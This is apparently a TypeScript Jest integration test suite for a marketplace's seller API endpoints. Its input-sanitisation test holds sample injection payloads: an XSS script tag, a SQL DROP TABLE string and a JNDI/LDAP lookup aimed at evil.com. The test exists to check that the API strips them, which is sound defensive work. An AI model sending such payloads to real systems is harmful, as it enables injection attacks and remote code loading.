import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import request from 'supertest';
import { Express } from 'express';

// Import test utilities
import { createTestApp } from '../utils/testApp';
import { setupTestDatabase, cleanupTestDatabase } from '../utils/testDatabase';

// Import services for testing
import { sellerService } from '../../services/sellerService';
import { sellerCacheManager } from '../../services/sellerCacheManager';
import { sellerWebSocketService } from '../../services/sellerWebSocketService';

describe('Seller Backend Integration Test Suite', () => {
  let app: Express;
  let testWalletAddress: string;

  beforeEach(async () => {
    app = await createTestApp();
    await setupTestDatabase();
    testWalletAddress = '0x1234567890123456789012345678901234567890';
    
    // Clear any cached data
    await sellerCacheManager.clearAll();
  });

  afterEach(async () => {
    await cleanupTestDatabase();
    jest.clearAllMocks();
  });

  describe('API Endpoint Consistency Tests', () => {
    it('should use standardized endpoint patterns for all seller operations', async () => {
      // Test profile endpoint
      const profileResponse = await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);

      expect(profileResponse.body.success).toBe(true);

      // Test onboarding endpoint
      const onboardingResponse = await request(app)
        .get(`/api/marketplace/seller/onboarding/${testWalletAddress}`)
        .expect(200);

      expect(onboardingResponse.body.success).toBe(true);

      // Test dashboard endpoint
      const dashboardResponse = await request(app)
        .get(`/api/marketplace/seller/dashboard/${testWalletAddress}`)
        .expect(200);

      expect(dashboardResponse.body.success).toBe(true);

      // Test listings endpoint
      const listingsResponse = await request(app)
        .get(`/api/marketplace/seller/listings/${testWalletAddress}`)
        .expect(200);

      expect(listingsResponse.body.success).toBe(true);

      // Test store endpoint
      const storeResponse = await request(app)
        .get(`/api/marketplace/seller/store/${testWalletAddress}`)
        .expect(200);

      expect(storeResponse.body.success).toBe(true);
    });

    it('should return consistent response format across all endpoints', async () => {
      const endpoints = [
        `/api/marketplace/seller/${testWalletAddress}`,
        `/api/marketplace/seller/onboarding/${testWalletAddress}`,
        `/api/marketplace/seller/dashboard/${testWalletAddress}`,
        `/api/marketplace/seller/listings/${testWalletAddress}`,
        `/api/marketplace/seller/store/${testWalletAddress}`,
      ];

      for (const endpoint of endpoints) {
        const response = await request(app)
          .get(endpoint)
          .expect(200);

        // All responses should have consistent structure
        expect(response.body).toHaveProperty('success');
        expect(response.body).toHaveProperty('data');
        expect(response.body.success).toBe(true);
        expect(response.headers['content-type']).toMatch(/application\/json/);
      }
    });

    it('should handle CORS headers consistently across all seller endpoints', async () => {
      const response = await request(app)
        .options(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);

      expect(response.headers['access-control-allow-origin']).toBeDefined();
      expect(response.headers['access-control-allow-methods']).toContain('GET');
      expect(response.headers['access-control-allow-methods']).toContain('POST');
      expect(response.headers['access-control-allow-methods']).toContain('PUT');
      expect(response.headers['access-control-allow-headers']).toContain('Content-Type');
    });

    it('should validate wallet address format consistently', async () => {
      const invalidWalletAddress = 'invalid-wallet-address';

      const endpoints = [
        `/api/marketplace/seller/${invalidWalletAddress}`,
        `/api/marketplace/seller/dashboard/${invalidWalletAddress}`,
        `/api/marketplace/seller/listings/${invalidWalletAddress}`,
      ];

      for (const endpoint of endpoints) {
        const response = await request(app)
          .get(endpoint)
          .expect(400);

        expect(response.body.success).toBe(false);
        expect(response.body.message).toContain('Invalid wallet address');
      }
    });
  });

  describe('Data Synchronization Tests', () => {
    it('should synchronize profile updates across all seller endpoints', async () => {
      // Create initial profile
      const initialProfile = {
        displayName: 'Initial Seller',
        storeName: 'Initial Store',
        bio: 'Initial bio',
      };

      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({ walletAddress: testWalletAddress, ...initialProfile })
        .expect(201);

      // Update profile
      const updatedProfile = {
        displayName: 'Updated Seller',
        storeName: 'Updated Store',
        bio: 'Updated bio',
      };

      await request(app)
        .put(`/api/marketplace/seller/${testWalletAddress}`)
        .send(updatedProfile)
        .expect(200);

      // Verify updates are reflected in all endpoints
      const profileResponse = await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);

      expect(profileResponse.body.data.displayName).toBe('Updated Seller');

      const dashboardResponse = await request(app)
        .get(`/api/marketplace/seller/dashboard/${testWalletAddress}`)
        .expect(200);

      expect(dashboardResponse.body.data.profile.displayName).toBe('Updated Seller');

      const storeResponse = await request(app)
        .get(`/api/marketplace/seller/store/${testWalletAddress}`)
        .expect(200);

      expect(storeResponse.body.data.seller.displayName).toBe('Updated Seller');
    });

    it('should handle concurrent profile updates correctly', async () => {
      // Create initial profile
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Concurrent Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      // Perform concurrent updates
      const updatePromises = [
        request(app)
          .put(`/api/marketplace/seller/${testWalletAddress}`)
          .send({ displayName: 'Update 1' }),
        request(app)
          .put(`/api/marketplace/seller/${testWalletAddress}`)
          .send({ displayName: 'Update 2' }),
        request(app)
          .put(`/api/marketplace/seller/${testWalletAddress}`)
          .send({ displayName: 'Update 3' }),
      ];

      const responses = await Promise.all(updatePromises);

      // All updates should succeed
      responses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);
      });

      // Final state should be consistent
      const finalProfile = await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);

      expect(finalProfile.body.data.displayName).toMatch(/Update [1-3]/);
    });

    it('should maintain referential integrity across seller data', async () => {
      // Create seller profile
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Integrity Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      // Create listing for seller
      await request(app)
        .post(`/api/marketplace/seller/listings/${testWalletAddress}`)
        .send({
          title: 'Test Product',
          description: 'Test description',
          price: 100,
          currency: 'USD',
        })
        .expect(201);

      // Verify listing references correct seller
      const listingsResponse = await request(app)
        .get(`/api/marketplace/seller/listings/${testWalletAddress}`)
        .expect(200);

      expect(listingsResponse.body.data).toHaveLength(1);
      expect(listingsResponse.body.data[0].sellerId).toBe(testWalletAddress);

      // Update seller profile
      await request(app)
        .put(`/api/marketplace/seller/${testWalletAddress}`)
        .send({ displayName: 'Updated Integrity Test' })
        .expect(200);

      // Verify listing still references correct seller
      const updatedListingsResponse = await request(app)
        .get(`/api/marketplace/seller/listings/${testWalletAddress}`)
        .expect(200);

      expect(updatedListingsResponse.body.data[0].sellerId).toBe(testWalletAddress);
    });
  });

  describe('Cache Invalidation Tests', () => {
    it('should invalidate cache when seller profile is updated', async () => {
      // Create profile
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Cache Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      // First request (should cache)
      const firstResponse = await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);

      expect(firstResponse.body.data.displayName).toBe('Cache Test');

      // Update profile (should invalidate cache)
      await request(app)
        .put(`/api/marketplace/seller/${testWalletAddress}`)
        .send({ displayName: 'Updated Cache Test' })
        .expect(200);

      // Second request (should get fresh data)
      const secondResponse = await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);

      expect(secondResponse.body.data.displayName).toBe('Updated Cache Test');
    });

    it('should invalidate related caches when seller data changes', async () => {
      // Create profile and listing
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Related Cache Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      await request(app)
        .post(`/api/marketplace/seller/listings/${testWalletAddress}`)
        .send({
          title: 'Test Product',
          description: 'Test description',
          price: 100,
          currency: 'USD',
        })
        .expect(201);

      // Cache dashboard data
      await request(app)
        .get(`/api/marketplace/seller/dashboard/${testWalletAddress}`)
        .expect(200);

      // Update profile
      await request(app)
        .put(`/api/marketplace/seller/${testWalletAddress}`)
        .send({ displayName: 'Updated Related Cache Test' })
        .expect(200);

      // Dashboard should reflect updated profile
      const dashboardResponse = await request(app)
        .get(`/api/marketplace/seller/dashboard/${testWalletAddress}`)
        .expect(200);

      expect(dashboardResponse.body.data.profile.displayName).toBe('Updated Related Cache Test');
    });

    it('should handle cache invalidation failures gracefully', async () => {
      // Mock cache invalidation failure
      jest.spyOn(sellerCacheManager, 'invalidateSellerCache').mockRejectedValueOnce(
        new Error('Cache invalidation failed')
      );

      // Create profile
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Cache Failure Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      // Update should still succeed even if cache invalidation fails
      await request(app)
        .put(`/api/marketplace/seller/${testWalletAddress}`)
        .send({ displayName: 'Updated Cache Failure Test' })
        .expect(200);

      // Data should still be updated
      const response = await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);

      expect(response.body.data.displayName).toBe('Updated Cache Failure Test');
    });
  });

  describe('Error Handling Consistency Tests', () => {
    it('should return consistent error format across all endpoints', async () => {
      const nonExistentWallet = '0x9999999999999999999999999999999999999999';

      const endpoints = [
        `/api/marketplace/seller/${nonExistentWallet}`,
        `/api/marketplace/seller/dashboard/${nonExistentWallet}`,
        `/api/marketplace/seller/listings/${nonExistentWallet}`,
      ];

      for (const endpoint of endpoints) {
        const response = await request(app)
          .get(endpoint)
          .expect(404);

        expect(response.body).toHaveProperty('success', false);
        expect(response.body).toHaveProperty('message');
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toHaveProperty('type');
        expect(response.body.error).toHaveProperty('code');
      }
    });

    it('should handle validation errors consistently', async () => {
      const invalidProfileData = {
        walletAddress: testWalletAddress,
        displayName: '', // Invalid: empty required field
        storeName: 'Test Store',
        bio: 'Test bio',
      };

      const response = await request(app)
        .post('/api/marketplace/seller/profile')
        .send(invalidProfileData)
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.type).toBe('VALIDATION_ERROR');
      expect(response.body.error.details).toContain('displayName');
    });

    it('should handle database errors gracefully', async () => {
      // Mock database error
      jest.spyOn(sellerService, 'createSellerProfile').mockRejectedValueOnce(
        new Error('Database connection failed')
      );

      const response = await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'DB Error Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(500);

      expect(response.body.success).toBe(false);
      expect(response.body.error.type).toBe('DATABASE_ERROR');
    });

    it('should implement proper error recovery mechanisms', async () => {
      // Create profile
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Recovery Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      // Mock temporary service failure
      let callCount = 0;
      jest.spyOn(sellerService, 'getSellerProfile').mockImplementation(async (walletAddress) => {
        callCount++;
        if (callCount < 3) {
          throw new Error('Temporary service failure');
        }
        return {
          walletAddress,
          displayName: 'Recovery Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        };
      });

      // Request should eventually succeed with retry logic
      const response = await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);

      expect(response.body.data.displayName).toBe('Recovery Test');
      expect(callCount).toBe(3);
    });
  });

  describe('Performance Benchmarking Tests', () => {
    it('should handle concurrent requests efficiently', async () => {
      // Create test profile
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Performance Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      const startTime = Date.now();
      
      // Make 50 concurrent requests
      const requests = Array.from({ length: 50 }, () =>
        request(app).get(`/api/marketplace/seller/${testWalletAddress}`)
      );

      const responses = await Promise.all(requests);
      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // All requests should succeed
      responses.forEach(response => {
        expect(response.status).toBe(200);
        expect(response.body.data.displayName).toBe('Performance Test');
      });

      // Should handle 50 concurrent requests within 5 seconds
      expect(totalTime).toBeLessThan(5000);
    });

    it('should optimize database queries for large datasets', async () => {
      // Create seller with many listings
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Large Dataset Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      // Create 100 listings
      const listingPromises = Array.from({ length: 100 }, (_, i) =>
        request(app)
          .post(`/api/marketplace/seller/listings/${testWalletAddress}`)
          .send({
            title: `Product ${i}`,
            description: `Description ${i}`,
            price: Math.random() * 1000,
            currency: 'USD',
          })
      );

      await Promise.all(listingPromises);

      const startTime = Date.now();
      
      // Fetch dashboard with all listings
      const response = await request(app)
        .get(`/api/marketplace/seller/dashboard/${testWalletAddress}`)
        .expect(200);

      const endTime = Date.now();
      const queryTime = endTime - startTime;

      expect(response.body.data.listings).toHaveLength(100);
      
      // Should handle large dataset within 2 seconds
      expect(queryTime).toBeLessThan(2000);
    });

    it('should implement efficient caching strategies', async () => {
      // Create profile
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Caching Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      // First request (cache miss)
      const startTime1 = Date.now();
      await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);
      const endTime1 = Date.now();
      const firstRequestTime = endTime1 - startTime1;

      // Second request (cache hit)
      const startTime2 = Date.now();
      await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);
      const endTime2 = Date.now();
      const cachedRequestTime = endTime2 - startTime2;

      // Cached request should be significantly faster
      expect(cachedRequestTime).toBeLessThan(firstRequestTime * 0.5);
    });

    it('should monitor and report performance metrics', async () => {
      // Create profile
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'Metrics Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      // Make request and check performance headers
      const response = await request(app)
        .get(`/api/marketplace/seller/${testWalletAddress}`)
        .expect(200);

      // Should include performance timing headers
      expect(response.headers['x-response-time']).toBeDefined();
      expect(response.headers['x-cache-status']).toBeDefined();
      
      const responseTime = parseFloat(response.headers['x-response-time']);
      expect(responseTime).toBeGreaterThan(0);
      expect(responseTime).toBeLessThan(1000); // Should be under 1 second
    });
  });

  describe('Real-time Features Integration Tests', () => {
    it('should handle WebSocket connections for seller updates', async () => {
      // Create profile
      await request(app)
        .post('/api/marketplace/seller/profile')
        .send({
          walletAddress: testWalletAddress,
          displayName: 'WebSocket Test',
          storeName: 'Test Store',
          bio: 'Test bio',
        })
        .expect(201);

      // Mock WebSocket connection
      const mockWebSocket = {
        send: jest.fn(),
        close: jest.fn(),
        readyState: 1,
      };

      // Register WebSocket connection
      sellerWebSocketService.addConnection(testWalletAddress, mockWebSocket as any);

      // Update profile (should trigger WebSocket notification)
      await request(app)
        .put(`/api/marketplace/seller/${testWalletAddress}`)
        .send({ displayName: 'Updated WebSocket Test' })
        .expect(200);

      // Verify WebSocket notification was sent
      expect(mockWebSocket.send).toHaveBeenCalledWith(
        expect.stringContaining('profile_updated')
      );
    });

    it('should handle WebSocket connection failures gracefully', async () => {
      // Mock WebSocket that fails to send
      const mockWebSocket = {
        send: jest.fn().mockImplementation(() => {
          throw new Error('WebSocket send failed');
        }),
        close: jest.fn(),
        readyState: 1,
      };

      sellerWebSocketService.addConnection(testWalletAddress, mockWebSocket as any);

      // Update should still succeed even if WebSocket fails
      await request(app)
        .put(`/api/marketplace/seller/${testWalletAddress}`)
        .send({ displayName: 'WebSocket Failure Test' })
        .expect(200);
    });
  });

  describe('Security and Authentication Tests', () => {
    it('should validate wallet ownership for sensitive operations', async () => {
      // Attempt to update profile without proper authentication
      const response = await request(app)
        .put(`/api/marketplace/seller/${testWalletAddress}`)
        .send({ displayName: 'Unauthorized Update' })
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error.type).toBe('AUTHENTICATION_ERROR');
    });

    it('should sanitize input data to prevent injection attacks', async () => {
      const maliciousData = {
        walletAddress: testWalletAddress,
        displayName: '<script>alert("xss")</script>',
        storeName: 'DROP TABLE sellers;',
        bio: '${jndi:ldap://evil.com/a}',
      };

      const response = await request(app)
        .post('/api/marketplace/seller/profile')
        .send(maliciousData)
        .expect(201);

      // Data should be sanitized
      expect(response.body.data.displayName).not.toContain('<script>');
      expect(response.body.data.storeName).not.toContain('DROP TABLE');
      expect(response.body.data.bio).not.toContain('${jndi:');
    });

    it('should implement rate limiting for seller operations', async () => {
      // Make multiple rapid requests
      const requests = Array.from({ length: 20 }, () =>
        request(app).get(`/api/marketplace/seller/${testWalletAddress}`)
      );

      const responses = await Promise.all(requests);
      
      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });
  });
});